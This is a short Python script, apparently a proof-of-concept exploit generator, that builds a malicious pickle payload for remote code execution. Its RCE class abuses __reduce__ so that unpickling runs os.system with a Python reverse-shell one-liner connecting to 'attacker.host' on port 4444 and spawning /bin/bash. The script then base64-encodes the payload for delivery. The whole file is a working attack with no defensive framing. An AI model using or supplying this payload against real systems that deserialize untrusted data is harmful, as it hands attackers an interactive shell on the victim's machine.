import pickle
import base64


class RCE(object):
    def __reduce__(self):
        import os

        cmd = 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("attacker.host",4444)); [os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\''
        return (os.system, (cmd,))


exploit = RCE()
pickled_exploit = pickle.dumps(exploit)
encoded_exploit = base64.b64encode(pickled_exploit).decode("utf-8")
print(encoded_exploit)
